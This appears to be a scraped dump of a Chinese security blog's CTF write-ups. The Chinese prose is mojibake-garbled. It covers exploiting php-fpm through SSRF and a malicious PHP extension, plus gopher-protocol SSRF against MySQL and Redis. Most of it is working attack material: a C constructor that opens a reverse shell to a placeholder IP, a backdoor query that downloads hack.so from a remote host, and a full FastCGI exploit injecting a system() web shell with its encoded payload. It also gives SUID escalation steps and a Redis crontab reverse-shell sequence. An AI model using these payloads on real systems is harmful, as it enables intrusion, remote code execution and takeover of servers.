_GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0&gt;&amp;1&#x27;&quot;);&#125; ç¼–è¯‘å¹¶å­˜æ”¾åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Š 1gcc hack.c -fPIC --shared -o hack.so å°†hack.soä¸Šä¼ åˆ°æŸä¸ªæœ‰æƒé™çš„ç›®å½•ä¸‹ï¼ˆè¿™é‡Œä½¿ç”¨/tmp 1&#x2F;add_api.php?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);copy(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xxxx&#x2F;hack.so&#39;,&#39;&#x2F;tmp&#x2F;hpdoger.so&#39;); åŠ è½½æ‰©å±•ä½¿ç”¨çš„æ˜¯phpé…ç½®ä¸­çš„extension_dirå’Œextensionï¼ŒæŒ‡å®šåŠ è½½æ‰©å±•çš„ç›®å½•å’Œæ‰©å±•å ç½‘ä¸Šæ‰¾ä¸ªå¯ç”¨çš„è„šæœ¬ç”Ÿæˆphp-fpmæ”»å‡»payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */class FCGIClient&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = &#x27;MAX_CONNS&#x27;; const MAX_REQS = &#x27;MAX_REQS&#x27;; const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket &#123; $this-&gt;_host = $host; $this-&gt;_port = $port; &#125; /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) &#123; $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123; fclose($this-&gt;_sock); &#125; &#125; /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() &#123; return $this-&gt;_keepAlive; &#125; /** * Create a connection to the FastCGI application */ private function connect() &#123; if (!$this-&gt;_sock) &#123; //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) &#123; throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;); &#125; &#125; &#125; /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) &#123; $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ &#125; /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) &#123; $array = array(); if ($length === null) &#123; $length = strlen($data); &#125; $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord($data&#123;0&#125;); $ret[&#x27;type&#x27;] = ord($data&#123;1&#125;); $ret[&#x27;requestId&#x27;] = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;); $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;); $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;); $ret[&#x27;reserved&#x27;] = ord($data&#123;7&#125;); return $ret; &#125; /** * Read a FastCGI Packet * * @return array */ private function readPacket() &#123; if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123; $resp = $this-&gt;decodePacketHeader($packet); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ($resp[&#x27;contentLength&#x27;]) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123; $len -= strlen($buf); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ($resp[&#x27;paddingLength&#x27;]) &#123; $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]); &#125; return $resp; &#125; else &#123; return false; &#125; &#125; /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ($requestedInfo as $info) &#123; $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;); &#125; fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123; return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]); &#125; else &#123; throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;); &#125; &#125; /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) &#123; $response = &#x27;&#x27;;// $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;); echo(&#x27;data=&#x27;.urlencode($request));// fwrite($this-&gt;_sock, $request);// do &#123;// $resp = $this-&gt;readPacket();// if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;// $response .= $resp[&#x27;content&#x27;];// &#125;// &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);// var_dump($resp);// if (!is_array($resp)) &#123;// throw new Exception(&#x27;Bad request&#x27;);// &#125;// switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;// case self::CANT_MPX_CONN:// throw new Exception(&#x27;This app can\\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);// break;// case self::OVERLOADED:// throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);// break;// case self::UNKNOWN_ROLE:// throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);// break;// case self::REQUEST_COMPLETE:// return $response;// &#125; &#125;&#125;?&gt;&lt;?php// real exploit start here//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;// die(&quot;Check your input\\n&quot;);//&#125;//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;// $filepath = __FILE__;//&#125;else&#123;// $filepath = $_REQUEST[&#x27;filepath&#x27;];//&#125;$filepath = &quot;/var/www/html/add_api.php&quot;; // ç›®æ ‡ä¸»æœºå·²çŸ¥çš„PHPæ–‡ä»¶çš„è·¯å¾„$req = &#x27;/&#x27;.basename($filepath);$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;; // å•¥ä¹Ÿä¸æ˜¯, ä¸ç”¨ç®¡$php_value = &quot;unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hpdoger.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = &quot;;$params = array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SCRIPT_NAME&#x27; =&gt; $req, &#x27;QUERY_STRING&#x27; =&gt; &#x27;command=whoami&#x27;, &#x27;REQUEST_URI&#x27; =&gt; $uri, &#x27;DOCUMENT_URI&#x27; =&gt; $req,#&#x27;DOCUMENT_ROOT&#x27; =&gt; &#x27;/&#x27;, &#x27;PHP_VALUE&#x27; =&gt; $php_value, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;80sec/wofeiwo&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9001&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;localhost&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\\n\\n&quot;;echo $client-&gt;request($params, $code).&quot;\\n&quot;;?&gt; payload 1data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 1&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xxxx&#x2F;123&amp;data&#x3D;xxx æ•°æ®ä¼ å…¥ä¸Šé¢è„šæœ¬ç”Ÿæˆçš„payload ftpæœåŠ¡å™¨ä¼šå‘Šè¯‰è¢«æ”»å‡»è€…å°†dataè½¬å‘åˆ°127.0.0.1:9001ç«¯å£ï¼Œä¹Ÿå°±æ˜¯fpmæ‰€åœ¨ç«¯å£ï¼Œå®Œæˆæ”»å‡» æ‹¿åˆ°shell 1find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null æŸ¥æ‰¾å…·æœ‰suidçš„ç”¨æˆ·ï¼Œå‘ç°phpæœ‰suidï¼Œphp -aè¿›å…¥äº¤äº’æ¨¡å¼ï¼Œè¯»å–flagæ–‡ä»¶","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpååºåˆ—åŒ–","slug":"CTF/phpååºåˆ—åŒ–","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSRFæ”»å‡»php-fpm","slug":"SSRFæ”»å‡»php-fpm","permalink":"https://123-prog.github.io/tags/SSRF%E6%94%BB%E5%87%BBphp-fpm/"},{"name":"ææƒ","slug":"ææƒ","permalink":"https://123-prog.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"SSRFä¹‹gopheråè®®åˆ©ç”¨","slug":"SSRFä¹‹gopheråè®®åˆ©ç”¨","date":"2021-04-27T04:13:57.000Z","updated":"2021-07-18T14:11:52.859Z","comments":true,"path":"2021/04/27/SSRFä¹‹gopheråè®®åˆ©ç”¨/","link":"","permalink":"https://123-prog.github.io/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/","excerpt":"SSRFä¹‹gopheråè®®çš„åˆ©ç”¨gopheråè®®æ ¼å¼ï¼š gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ ä¸€ä¸ªä¸‹åˆ’çº¿å¯ä»¥æ›¿æ¢æˆä»»æ„å­—ç¬¦ï¼Œä½†å¿…é¡»æœ‰ä¸ç„¶æ•°æ®æµçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¼šè¢«åæ‰ å¤§æ¦‚ä½¿ç”¨å¦‚ä¸‹ å¼€ä¸€ä¸ªåœ¨1234ç«¯å£çš„ç›‘å¬","text":"SSRFä¹‹gopheråè®®çš„åˆ©ç”¨gopheråè®®æ ¼å¼ï¼š gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ ä¸€ä¸ªä¸‹åˆ’çº¿å¯ä»¥æ›¿æ¢æˆä»»æ„å­—ç¬¦ï¼Œä½†å¿…é¡»æœ‰ä¸ç„¶æ•°æ®æµçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¼šè¢«åæ‰ å¤§æ¦‚ä½¿ç”¨å¦‚ä¸‹ å¼€ä¸€ä¸ªåœ¨1234ç«¯å£çš„ç›‘å¬ åˆ©ç”¨curlå‘é€gopherè¯·æ±‚ gopheréœ€è¦æŒ‡å®šç«¯å£ å¯ä»¥çœ‹åˆ°æ•°æ®è¿‡æ¥äº† å¯ä»¥æ„é€ å„ç§tcpæ•°æ®æµï¼Œæ¯”å¦‚httpè¯·æ±‚ ç¬¬ä¸€ï¼Œæ„é€ httpæ•°æ®åŒ… ç¬¬äºŒï¼Œè¿›è¡Œå¿…è¦çš„ç¼–ç è½¬æ¢ï¼Œå¿…è¦çš„å­—ç¬¦è¦è¿›è¡Œurlç¼–ç ï¼Œè¿™é‡Œå›è½¦ï¼ˆ\\r\\n)éœ€è¦æ›¿æ¢ä¸º%0d%0a,åœ¨åŒ…çš„ç»“å°¾è¿˜è¦åŠ ä¸Š%0d%0aæ ‡å¿—åŒ…ç»“æŸ ç¬¬ä¸‰ï¼Œå‘é€è¯·æ±‚ è¿›è¡Œæµ‹è¯•å†™ä¸€ä¸ªget.phpæ–‡ä»¶æ¥è¿›è¡Œæµ‹è¯• 1&lt;?php echo &quot;*****************hello_world*********************&quot;;?&gt; åœ¨kaliè™šæ‹Ÿæœºç¯å¢ƒä¸‹è¿›è¡Œå®éªŒï¼Œè™šæ‹Ÿæœºip:192.168.245.129 åœ¨æµè§ˆå™¨è¯·æ±‚get.phpçš„è¯·æ±‚åŒ… æ ¹æ®è¿™ä¸ªè¯·æ±‚åŒ…ï¼Œæ„é€ httpæ•°æ®åŒ…ï¼ŒHostå¤´æ˜¯è™šæ‹Ÿæœºipï¼Œæœ¬åœ°è®¿é—®ï¼Œåœ¨SSRFä¸­ï¼Œé€šå¸¸éƒ½æ˜¯ä¼ªé€ æœ¬åœ°è®¿é—®ç»•è¿‡ä¸€äº›é™åˆ¶ å¯¹æ•°æ®è¿›è¡Œä¸€å®šç¼–ç åå¾—åˆ°gopheråè®®ç”¨çš„httpæ•°æ®åŒ…ï¼Œæ³¨æ„æŒ‡å®šgopheråè®®ç«¯å£å·80ï¼Œä¸ºhttpæœåŠ¡é»˜è®¤ç›‘å¬ç«¯å£ 1gopher:&#x2F;&#x2F;192.168.245.129:80&#x2F;_GET%20&#x2F;get.php%20HTTP&#x2F;1.1%0d%0aHost:%20192.168.245.129%0d%0a å›åº”æ­£å¸¸ æ¥ä¸‹æ¥è¿›è¡Œpostè¯·æ±‚çš„æµ‹è¯• æ”¹ä¸€æ”¹get.php 123456789&lt;?php if(isset($_POST[&#x27;name&#x27;]))&#123; echo &quot;Hello_&#123;$_POST[&#x27;name&#x27;]&#125;&quot;.&quot;&lt;br&gt;&quot;;&#125;else&#123;echo &quot;*****************hello_world*********************&quot;;?&gt;&#125; çœ‹ä¸€çœ‹åˆ©ç”¨æµè§ˆå™¨httpè¯·æ±‚åŒ… postè¯·æ±‚ä¸getæœ‰ä¸€å®šåŒºåˆ«ï¼Œåœ¨postä¸­ï¼Œæœ‰å‡ ä¸ªå¿…é¡»çš„å¤´ï¼ŒContent-type,Content-Lengthï¼Œhostå’Œpostçš„æ•°æ® 1gopher:&#x2F;&#x2F;192.168.245.129:80&#x2F;_POST%20&#x2F;get.php%20HTTP&#x2F;1.1%0d%0aHost:%20192.168.245.129%0d%0aContent-Length:6%0d%0aContent-Type:application&#x2F;x-www-form-urlencoded%0d%0a%0d%0aname&#x3D;1%0d%0a å¾—åˆ°é¢„æœŸæ•°æ® åˆ©ç”¨gopheråè®®æ”»å‡»Mysqlæˆ‘åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒè¿›è¡Œæµ‹è¯• åˆ©ç”¨tcp/ipå¥—æ¥å­—æ¥è¿æ¥å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œå³é€šè¿‡å¦‚mysql -h127.0.0.1 -urootæ¥ç™»å½•mysqlæœåŠ¡å™¨ å‡†å¤‡æŠ“ä¸€ä¸‹åŒ…æ¥çœ‹çœ‹åœ¨mysqlå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„é€šä¿¡ï¼Œå¹¶è·å–tcpæ•°æ®åŒ…ï¼Œå†åˆ©ç”¨gopheråè®®å‘é€æ•°æ®åŒ…å®ç°å¯¹æ•°æ®åº“çš„å„ç§æ“ä½œ é€šå¸¸åˆ©ç”¨gopheræ¥æ”»å‡»Mysqlå¿…é¡»æ˜¯åœ¨Mysqlè¿œç¨‹ç™»å½•å¹¶æ²¡æœ‰è®¾ç½®å¯†ç éªŒè¯çš„æ¡ä»¶ä¸‹ï¼Œå¦‚æœè®¾æœ‰éªŒè¯ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯è¦è¿›è¡Œäº¤äº’éªŒè¯èº«ä»½ï¼Œä½†æˆ‘ä»¬åˆ©ç”¨gopherå‘é€æ•°æ®åŒ…å¹¶ä¸èƒ½åšåˆ°ã€‚ ç¯å¢ƒï¼š ubuntuè™šæ‹Ÿæœºip : 192.168.245.130 mysql 5.7 wiresharkæŠ“åŒ…å·¥å…· åœ¨ubuntuä¸Šå¼€å¯mysqlæœåŠ¡ï¼Œç”¨netstatçœ‹3306ç«¯å£æ˜¯å¦æ­£å¸¸æ­è½½mysqldæœåŠ¡ ä¸€åˆ‡æ­£å¸¸å°±å¯ä»¥å¼€å§‹æŠ“åŒ…ï¼Œè¿œç¨‹ç™»å½•æ•°æ®åº“ æ‰“å¼€æœ¬åœ°wiresharkï¼Œé€‰æ‹©ubuntuè™šæ‹Ÿæœºå¯¹åº”çš„è™šæ‹Ÿç½‘å¡ï¼Œå¼€å§‹ç›‘å¬æ•°æ®æµ å…¶å®åº”è¯¥åœ¨ubuntuä¸Šä½¿ç”¨tcpdumpæŠ“localçš„åŒ…ï¼Œå¹¶ä½¿ç”¨ubuntuä¸Šçš„mysqlå®¢æˆ·ç«¯è¿æ¥æœ¬åœ°ç¯å›åœ°å€ä¸Šçš„mysqlæœåŠ¡ç«¯ï¼Œæˆ‘è¿™é‡Œä¸»è¦ä¸ºäº†æ¼”ç¤ºï¼Œäº†è§£ä¸€ä¸‹mysqlå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„é€šä¿¡ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œmysqléƒ½ä¸ä¼šè®©éšä¾¿ä¸€ä¸ªipç™»å½•ï¼ˆæˆ‘è¿™é‡Œæ”¹äº†é…ç½®ï¼‰ï¼Œä½†localhosté€šå¸¸å¯ä»¥ç™»å½•åˆ°æœåŠ¡ç«¯ ç„¶åè¿œç¨‹ç™»å½•mysqlæœåŠ¡ ç„¶åè¿›è¡Œä¸€äº›æ•°æ®åº“çš„æ“ä½œ ç„¶ååœ¨wiresharkä¸­å¯ä»¥çœ‹åˆ°åŒ… éšä¾¿é€‰æ‹©ä¸€ä¸ªmysqlåè®®çš„åŒ…ï¼Œè¿½è¸ªtcpæµï¼Œå°±å¯ä»¥è·å–å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´çš„é€šä¿¡ æˆ‘ä»¬ç°åœ¨éœ€è¦çš„æ˜¯ï¼Œå®¢æˆ·ç«¯å‘æ•°æ®ç«¯å‘é€çš„æ•°æ®åŒ…ï¼Œå·¦ä¸‹è§’å¯¹è¯é‚£é‡Œè¿›è¡Œç­›é€‰ ç­›é€‰å‘é€åˆ°ç«¯å£3306çš„æ•°æ®ï¼Œä»¥åŸå§‹æ•°æ®ä¿ç•™ï¼Œå¹¶è½¬åŒ–æˆurlç¼–ç  è½¬åŒ–å¯ä»¥ä½¿ç”¨è„šæœ¬æˆ–è€…æ‰¾å·¥å…· è½¬åŒ–åä½¿ç”¨gopherè¿›è¡Œä¼ è¾“ï¼Œå¹¶å°†è·å¾—çš„è¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶ä¸­ æ‰“å¼€æ–‡ä»¶å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„æŸ¥è¯¢ç»“æœ æœ€åå†™ä¸€ä¸‹é‡åˆ°çš„ä¸€äº›é—®é¢˜ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯mysql8.0.xï¼Œæœ‰å¯èƒ½æ— æ³•ä»¥rootç”¨æˆ·è¿œç¨‹ç™»å½•åˆ°mysqlæœåŠ¡å™¨ï¼Œè·Ÿmysql8é»˜è®¤ä½¿ç”¨çš„è®¤è¯æ’ä»¶æœ‰å…³ï¼Œåœ¨mysqlæ•°æ®åº“ä¸­æ›´æ”¹userè¡¨çš„pluginå­—æ®µä¸ºmysql_native_passwordå³å¯è§£å†³ï¼Œè€Œä¸”mysql8ä¸­ä¸èƒ½å¼€å¯skip_grant_tablesï¼Œä¸ç„¶å®ƒè¿networkè¿™ä¸€éƒ¨åˆ†ä¹Ÿç»™ä½ å…³äº†ï¼ˆä¹°ä¸€é€ä¸€ å¦‚æœæŠ“åŒ…ç»“æœä¸­ä»¥TLSv1.2åè®®è¿›è¡Œä¼ è¾“æ•°æ®ï¼Œæ˜¯æ— æ³•çœ‹åˆ°ä¼ è¾“çš„æ•°æ®å†…å®¹çš„ ï¼Œä¸mysqlå¼€å¯äº†SSLæœ‰å…³ï¼Œå…³äº†å°±å¥½ï¼Œå…³é—­æ–¹å¼ä¸ºï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¢åŠ  12# disable_ssl skip_ssl é‡å¯æœåŠ¡å†è¿›è¡ŒæŠ“åŒ…å°±å¯ä»¥äº† è¿™æ¬¡æµ‹è¯•å®éªŒåªæ˜¯å•çº¯ä¸ºäº†æ›´åŠ æ·±å…¥äº†è§£gopherçš„åº”ç”¨å’Œmysqlå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„é€šä¿¡ï¼Œæ­£å¸¸æƒ…å†µå‡ ä¹éƒ½ä¸æ˜¯è¿™æ ·å­åˆ©ç”¨ åˆ©ç”¨gopheråè®®æ”»å‡»Redisredisä¸€èˆ¬è¿è¡Œåœ¨6379ç«¯å£ï¼Œå¦‚æœæ‰«åˆ°è¿™ä¸ªç«¯å£å¼€ç€ï¼Œå°±å¾ˆå¯èƒ½æ˜¯redisï¼Œå¯ä»¥å°è¯•åˆ©ç”¨ï¼Œä¸€èˆ¬åˆ©ç”¨æ–¹å¼æ˜¯å†™å…¥Crontabå®šæ—¶åå¼¹shell ä¸€èˆ¬æ”»å‡»æµç¨‹ï¼š 12345redis-cli flushallecho -e &quot;\\n\\n*\\1 * * * * bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;1234 0&gt;&amp;1\\n\\n&quot; | redis-cli -x set 1redis-cli config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;redis-cli config set dbfilename rootredis-cli save flushallåˆ é™¤æ•°æ®åº“ä¸­çš„æ‰€æœ‰key redis-cli -xï¼š-xå‚æ•°è¡¨ç¤ºä»æ ‡å‡†è¾“å…¥è¯»å–å‚æ•°ï¼Œè¿™é‡Œæ·»åŠ äº†ä¸€ä¸ªkeyä¸º1ï¼Œå€¼ä¸ºå®šæ—¶ä»»åŠ¡çš„å­—æ®µ dir,dbfilename: 